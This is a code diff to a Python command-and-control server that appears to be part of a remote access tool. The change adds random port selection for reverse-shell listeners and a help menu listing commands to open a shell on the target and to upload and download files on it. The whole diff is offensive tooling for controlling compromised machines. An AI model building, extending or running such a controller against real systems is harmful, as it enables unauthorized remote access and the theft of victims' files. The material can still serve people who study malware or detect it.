@@ -2,6 +2,7 @@ import socket
 import json
 import sys
 import time
+import random
 
 HOST = "127.0.0.1" # Address to listen on
 PORT = 6969 # Port to listen on. (Better to use unprivileged ports)
@@ -20,10 +21,11 @@ def shell(conn):
     """Actions performed when the shell command is typed"""
     print("\033[96m[INFO] Dropping into a shell...\033[91m")
     time.sleep(0.5)
-    send_command(conn, "shell") # TODO: Implement a random port generator for multiple reverse shell handling
+    port = random.randint(49152, 65525) # Generate a random port for the reverse shell
+    send_command(conn, "shell", port)
 
     lst = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Creates a new socket for the reverse shell
-    lst.bind((HOST, 4242))
+    lst.bind((HOST, port))
     lst.listen(1)
     cn, addr = lst.accept()
     while True:
@@ -54,9 +56,17 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
             command = input("\033[1mCMD> \033[0m") # Request user command input
             match command: # Parse user command input
                 case 'help':
-                    pass # TODO: create a help section
+                    print("""
+                        \n<NOME DEL TOOL> 0.1
+                        Usage: CMD> [command] [options]
+
+                        COMMANDS:
+                            shell: Opens a reverse shell on the target
+                            upload <local_file>: Uploads a specified file (full local path)
+                            download <remote_file>: Downloads a file from the remote host\n
+                        """)
                 case 'shell':
-                    shell(conn) # TODO: check why dropping a second time in a reverse shell won't work
+                    shell(conn)
 
 
 
